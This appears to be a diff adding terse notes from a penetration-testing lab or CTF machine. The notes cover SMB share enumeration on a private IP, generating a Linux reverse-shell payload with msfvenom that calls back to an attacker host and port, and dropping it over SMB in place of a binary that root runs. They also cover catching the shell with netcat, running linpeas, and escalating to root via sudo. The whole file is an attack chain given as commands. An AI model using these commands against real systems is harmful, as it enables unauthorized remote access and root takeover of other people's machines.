@@ -1,0 +1,15 @@
+
+smbmap -H 192.168.100.83
+
+smbclient //192.168.100.83/ITDEPT
+
+msfvenom -p linux/x64/shell_reverse_tcp lhost=192.168.100.14 lport=5555 -f elf -o web-control 
+because web-control running by root
+
+
+putting to smb and listening --> rlwrap nc -nvlp 5555
+
+in /var/tmp  linpeash executing
+
+
+/usr/bin/sudo -u root sudo su root 
